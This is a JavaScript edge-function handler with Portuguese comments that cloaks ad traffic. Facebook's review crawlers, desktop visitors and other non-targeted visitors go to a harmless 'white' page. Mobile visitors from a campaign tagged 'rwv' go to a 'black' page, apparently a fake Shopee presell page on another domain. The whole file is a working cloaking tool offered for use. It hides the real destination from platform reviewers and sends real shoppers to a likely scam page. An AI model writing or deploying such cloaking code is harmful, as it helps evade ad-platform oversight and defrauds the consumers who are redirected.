export const config = {
  runtime: 'edge',
};

export default function handler(req) {
  const url = new URL(req.url);
  const userAgent = req.headers.get('user-agent') || '';
  
  // Captura a UTM e a Query String completa
  const utmCampaign = url.searchParams.get('utm_campaign') || '';
  const queryString = url.search; 

  const pageWhite = "https://cheerful-bloom-box.lovable.app/";
  const pageBlack = "https://casadasspanelas.shop/shopee/presell-ml/";

  // Filtros
  const isMobile = /Android|iPhone|iPad|iPod/i.test(userAgent);
  const isFacebook = /facebookexternalhit|Facebot|FBAN|FBAV/i.test(userAgent);
  
  // Sua regra: campaign precisa conter 'rwv'
  const hasVn = utmCampaign.includes('rwv');

  // Lógica de Redirecionamento
  if (!isFacebook && isMobile && hasVn) {
    // Vai para a BLACK mantendo os parâmetros
    const finalDestination = `${pageBlack}${queryString}`;
    return Response.redirect(finalDestination, 302);
  }

  // Todo o resto vai para a WHITE
  return Response.redirect(pageWhite, 302);
}
